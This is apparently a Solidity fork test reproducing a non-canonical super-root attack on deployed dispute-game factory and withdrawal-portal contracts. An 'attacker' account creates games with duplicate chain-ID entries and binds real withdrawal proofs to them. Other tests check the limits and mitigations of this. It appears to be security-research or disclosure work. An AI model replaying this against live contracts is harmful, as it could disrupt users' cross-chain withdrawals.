// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "./U21Fixtures.sol";

struct OutputRootProof {
    bytes32 version;
    bytes32 stateRoot;
    bytes32 messagePasserStorageRoot;
    bytes32 latestBlockhash;
}

interface IDisputeGameFactoryCATKD {
    function gameCount() external view returns (uint256);
    function initBonds(uint32) external view returns (uint256);
    function create(uint32, bytes32, bytes calldata) external payable returns (address);
    function gameAtIndex(uint256) external view returns (uint32, uint64, address);
}

interface ITrojanGameCATKD {
    function rootClaim() external pure returns (bytes32);
    function rootClaimByChainId(uint256) external pure returns (bytes32);
    function extraData() external pure returns (bytes memory);
    function status() external view returns (uint8);
    function gameCreator() external pure returns (address);
    function claimData(uint256)
        external
        view
        returns (uint32, address, address, uint128, bytes32, uint128, uint128);
    function normalModeCredit(address) external view returns (uint256);
}

interface ITrojanPortalCATKD {
    function proveWithdrawalTransaction(
        WithdrawalTransaction calldata,
        uint256,
        OutputRootProof calldata,
        bytes[] calldata
    ) external;
}

/// @notice CATK-D local-fork reproduction of the non-canonical super-root lifecycle.
/// The deployed factory, game implementation, portal, and a real withdrawal proof are used.
/// No public-network transaction is emitted.
contract TrojanSuperRootTest is U21FixtureBase {
    IDisputeGameFactoryCATKD internal constant DGF =
        IDisputeGameFactoryCATKD(0xe5965Ab5962eDc7477C8520243A95517CD252fA9);
    address internal constant ATTACKER = address(0xA77AC);
    address internal constant DELETER = address(0xD3137E);
    uint32 internal constant SUPER_CANNON_KONA = 9;
    uint256 internal constant OP_CHAIN_ID = 10;
    uint64 internal constant PINNED_L2_TIMESTAMP = 1_794_906_963;

    struct DecodedProof {
        WithdrawalTransaction withdrawal;
        uint256 originalGameIndex;
        OutputRootProof outputRootProof;
        bytes[] withdrawalProof;
    }

    function setUp() public {
        vm.createSelectFork("l1");
        vm.deal(ATTACKER, 10 ether);
    }

    function test_createTrojanAndProveRealWithdrawal_deployedBytecode() public {
        Fixture memory f = _loadFixture(1); // real, unfinalized, claim-valid withdrawal at the pin
        DecodedProof memory p = _decodeProof(f.proveCalldata);

        (uint256 trojanIndex, address trojan, bytes32 outputRoot, bytes memory nonCanonical) =
            _createTrojan(p.outputRootProof);

        assertEq(ITrojanGameCATKD(trojan).rootClaim(), keccak256(nonCanonical), "root claim");
        assertEq(ITrojanGameCATKD(trojan).rootClaimByChainId(OP_CHAIN_ID), outputRoot, "first-match root");
        assertEq(ITrojanGameCATKD(trojan).status(), 0, "new game is in progress");

        vm.warp(block.timestamp + 1); // portal disallows proving in the creation timestamp
        vm.prank(ATTACKER, ATTACKER);
        ITrojanPortalCATKD(address(PORTAL)).proveWithdrawalTransaction(
            p.withdrawal, trojanIndex, p.outputRootProof, p.withdrawalProof
        );

        (address storedGame, uint64 proofTime) = PORTAL.provenWithdrawals(f.hash, ATTACKER);
        assertEq(storedGame, trojan, "real withdrawal bound to trojan game");
        assertGt(proofTime, 0, "proof timestamp");
    }

    function test_toolingCompatibleRecentRoot_provesPersistentRealWithdrawal() public {
        Fixture memory f = _loadFixture(1);
        DecodedProof memory p = _decodeProof(f.proveCalldata);

        string memory j = vm.readFile("./testdata/latest-withdrawal-proof.json");
        p.outputRootProof = OutputRootProof({
            version: bytes32(0),
            stateRoot: vm.parseJsonBytes32(j, ".stateRoot"),
            messagePasserStorageRoot: vm.parseJsonBytes32(j, ".messagePasserStorageRoot"),
            latestBlockhash: vm.parseJsonBytes32(j, ".latestBlockhash")
        });
        p.withdrawalProof = vm.parseJsonBytesArray(j, ".proof");

        (uint256 trojanIndex, address trojan, bytes32 outputRoot,) =
            _createTrojanAtTimestamp(p.outputRootProof, PINNED_L2_TIMESTAMP);
        assertEq(
            ITrojanGameCATKD(trojan).rootClaimByChainId(OP_CHAIN_ID),
            outputRoot,
            "game lookup differs from recomputed L2 output root"
        );

        vm.warp(block.timestamp + 1);
        vm.prank(ATTACKER, ATTACKER);
        ITrojanPortalCATKD(address(PORTAL)).proveWithdrawalTransaction(
            p.withdrawal, trojanIndex, p.outputRootProof, p.withdrawalProof
        );

        (address storedGame,) = PORTAL.provenWithdrawals(f.hash, ATTACKER);
        assertEq(storedGame, trojan, "persistent withdrawal did not prove at recent L2 state");
    }

    function test_futureSharedShape_unsortedExtraChainAndDuplicateOpStillProves() public {
        Fixture memory f = _loadFixture(1);
        DecodedProof memory p = _decodeProof(f.proveCalldata);
        bytes32 outputRoot = keccak256(
            abi.encode(
                p.outputRootProof.version,
                p.outputRootProof.stateRoot,
                p.outputRootProof.messagePasserStorageRoot,
                p.outputRootProof.latestBlockhash
            )
        );

        // A future shared-game shape: an unrelated chain precedes OP, and OP occurs twice.
        // The deployed decoder/portal still walks to the first chain-10 entry and accepts it.
        bytes memory nonCanonical = bytes.concat(
            bytes1(0x01),
            bytes8(uint64(block.timestamp + 1)),
            bytes32(uint256(130)),
            bytes32(uint256(0x130BAD)),
            bytes32(OP_CHAIN_ID),
            outputRoot,
            bytes32(OP_CHAIN_ID),
            bytes32(uint256(0x10BAD))
        );
        (uint256 gameIndex, address game) = _deployGame(nonCanonical);
        assertEq(ITrojanGameCATKD(game).rootClaimByChainId(OP_CHAIN_ID), outputRoot, "first OP root");

        vm.warp(block.timestamp + 1);
        vm.prank(ATTACKER, ATTACKER);
        ITrojanPortalCATKD(address(PORTAL)).proveWithdrawalTransaction(
            p.withdrawal, gameIndex, p.outputRootProof, p.withdrawalProof
        );
        (address storedGame,) = PORTAL.provenWithdrawals(f.hash, ATTACKER);
        assertEq(storedGame, game, "shared-shape proof rejected");
    }

    function test_attackerProofCannotOverwriteExistingSubmitterProof() public {
        Fixture memory f = _loadFixture(1);
        DecodedProof memory p = _decodeProof(f.proveCalldata);
        (address victimGameBefore, uint64 victimTimeBefore) = PORTAL.provenWithdrawals(f.hash, f.proofSubmitter);
        assertEq(victimGameBefore, f.game, "fixture victim game");

        (uint256 trojanIndex,,,) = _createTrojan(p.outputRootProof);
        vm.warp(block.timestamp + 1);
        vm.prank(ATTACKER, ATTACKER);
        ITrojanPortalCATKD(address(PORTAL)).proveWithdrawalTransaction(
            p.withdrawal, trojanIndex, p.outputRootProof, p.withdrawalProof
        );

        (address victimGameAfter, uint64 victimTimeAfter) = PORTAL.provenWithdrawals(f.hash, f.proofSubmitter);
        assertEq(victimGameAfter, victimGameBefore, "victim game changed");
        assertEq(victimTimeAfter, victimTimeBefore, "victim timer changed");
    }

    function test_sameSubmitterCanImmediatelyReplaceTrojanProofWithHonestGame() public {
        Fixture memory f = _loadFixture(1);
        DecodedProof memory p = _decodeProof(f.proveCalldata);
        (uint256 trojanIndex, address trojan,,) = _createTrojan(p.outputRootProof);

        vm.warp(block.timestamp + 1);
        vm.prank(ATTACKER, ATTACKER);
        ITrojanPortalCATKD(address(PORTAL)).proveWithdrawalTransaction(
            p.withdrawal, trojanIndex, p.outputRootProof, p.withdrawalProof
        );
        (address badGame,) = PORTAL.provenWithdrawals(f.hash, ATTACKER);
        assertEq(badGame, trojan, "trojan proof missing");

        // No status mutation and no delete: the same submitter can immediately overwrite
        // its own slot with the fixture's honest game using the exact mainnet calldata.
        vm.warp(block.timestamp + 1);
        (bool ok, bytes memory ret) = _reproveAs(f, ATTACKER);
        assertTrue(ok, string.concat("immediate honest reprove failed: ", vm.toString(ret)));
        (address honestGame, uint64 honestTime) = PORTAL.provenWithdrawals(f.hash, ATTACKER);
        assertEq(honestGame, f.game, "submitter remained bound to trojan game");
        assertEq(honestTime, uint64(block.timestamp), "honest proof did not reset timer");
    }

    function test_harnessStatusFlip_deleteAndReproveAgainstHonestGame() public {
        Fixture memory f = _loadFixture(1);
        DecodedProof memory p = _decodeProof(f.proveCalldata);
        (uint256 trojanIndex, address trojan,,) = _createTrojan(p.outputRootProof);

        vm.warp(block.timestamp + 1);
        vm.prank(ATTACKER, ATTACKER);
        ITrojanPortalCATKD(address(PORTAL)).proveWithdrawalTransaction(
            p.withdrawal, trojanIndex, p.outputRootProof, p.withdrawalProof
        );

        // HARNESS-ONLY: completing a real Cannon/Kona fault proof is outside this minimal
        // fixture. Flip only the packed status byte (slot 0, offset 16) to model the
        // deterministic result of an honest challenge to the deliberately non-canonical root.
        bytes32 packed = vm.load(trojan, bytes32(uint256(0)));
        uint256 cleared = uint256(packed) & ~(uint256(0xff) << 128);
        vm.store(trojan, bytes32(uint256(0)), bytes32(cleared | (uint256(1) << 128)));
        assertEq(ITrojanGameCATKD(trojan).status(), 1, "status flip failed");

        vm.prank(DELETER, DELETER);
        PORTAL.deleteProvenWithdrawal(f.hash, ATTACKER);
        (address afterDelete, uint64 timeAfterDelete) = PORTAL.provenWithdrawals(f.hash, ATTACKER);
        assertEq(afterDelete, address(0), "game not deleted");
        assertEq(timeAfterDelete, 0, "timestamp not deleted");

        // The affected submitter can immediately choose the known honest game and restart
        // the seven-day portal proof timer using the exact mainnet calldata.
        (bool ok, bytes memory ret) = _reproveAs(f, ATTACKER);
        assertTrue(ok, string.concat("honest reprove failed: ", vm.toString(ret)));
        (address honestGame, uint64 honestTime) = PORTAL.provenWithdrawals(f.hash, ATTACKER);
        assertEq(honestGame, f.game, "did not rebind to honest game");
        assertEq(honestTime, uint64(block.timestamp), "timer not restarted");
    }

    function test_liveChallengerWinsProofIsPermissionlesslyDeletable() public {
        Fixture memory forged = _loadFixture(9);
        assertEq(IGame(forged.game).status(), 1, "fixture game not challenger-wins");
        (address storedBefore, uint64 timeBefore) = PORTAL.provenWithdrawals(forged.hash, forged.proofSubmitter);
        assertEq(storedBefore, forged.game, "fixture proof missing");
        assertGt(timeBefore, 0, "fixture timestamp");

        vm.prank(DELETER, DELETER);
        PORTAL.deleteProvenWithdrawal(forged.hash, forged.proofSubmitter);
        (address storedAfter, uint64 timeAfter) = PORTAL.provenWithdrawals(forged.hash, forged.proofSubmitter);
        assertEq(storedAfter, address(0), "live proof not deleted");
        assertEq(timeAfter, 0, "live proof timestamp not deleted");
    }

    function test_liveChallengerWinsRootBondIsCreditedToCounterer() public {
        Fixture memory forged = _loadFixture(9); // game 21288, resolved through real onchain moves
        ITrojanGameCATKD game = ITrojanGameCATKD(forged.game);
        assertEq(game.status(), 1, "not challenger-wins");

        (, address counteredBy, address claimant, uint128 rootBond,,,) = game.claimData(0);
        assertTrue(counteredBy != address(0), "root was not countered");
        assertEq(claimant, game.gameCreator(), "root claimant/creator mismatch");
        assertEq(uint256(rootBond), 0.08 ether, "unexpected root bond");
        assertGe(game.normalModeCredit(counteredBy), uint256(rootBond), "counterer did not receive root bond credit");
    }

    function _createTrojan(OutputRootProof memory outputProof)
        internal
        returns (uint256 index, address game, bytes32 outputRoot, bytes memory extraData)
    {
        return _createTrojanAtTimestamp(outputProof, uint64(block.timestamp + 1));
    }

    function _createTrojanAtTimestamp(OutputRootProof memory outputProof, uint64 l2Timestamp)
        internal
        returns (uint256 index, address game, bytes32 outputRoot, bytes memory extraData)
    {
        outputRoot = keccak256(
            abi.encode(
                outputProof.version,
                outputProof.stateRoot,
                outputProof.messagePasserStorageRoot,
                outputProof.latestBlockhash
            )
        );

        // Two entries for chain 10 are non-canonical. The portal/game lookup accepts the
        // first entry, whose root is the genuine output root used by the real MPT proof.
        extraData = bytes.concat(
            bytes1(0x01),
            bytes8(l2Timestamp),
            bytes32(OP_CHAIN_ID),
            outputRoot,
            bytes32(OP_CHAIN_ID),
            bytes32(uint256(0xBADCAFE))
        );

        (index, game) = _deployGame(extraData);
    }

    function _deployGame(bytes memory extraData) internal returns (uint256 index, address game) {
        index = DGF.gameCount();
        uint256 bond = DGF.initBonds(SUPER_CANNON_KONA);
        assertEq(bond, 0.08 ether, "unexpected type-9 bond");
        vm.prank(ATTACKER, ATTACKER);
        game = DGF.create{ value: bond }(SUPER_CANNON_KONA, keccak256(extraData), extraData);
        (uint32 gameType,, address indexedGame) = DGF.gameAtIndex(index);
        assertEq(gameType, SUPER_CANNON_KONA, "wrong game type");
        assertEq(indexedGame, game, "wrong game index");
        assertEq(ITrojanGameCATKD(game).gameCreator(), ATTACKER, "wrong creator");
    }

    function _decodeProof(bytes memory calldata_) internal pure returns (DecodedProof memory p) {
        require(calldata_.length > 4, "short prove calldata");
        bytes memory body = new bytes(calldata_.length - 4);
        for (uint256 i = 4; i < calldata_.length; i++) body[i - 4] = calldata_[i];
        (p.withdrawal, p.originalGameIndex, p.outputRootProof, p.withdrawalProof) =
            abi.decode(body, (WithdrawalTransaction, uint256, OutputRootProof, bytes[]));
    }
}
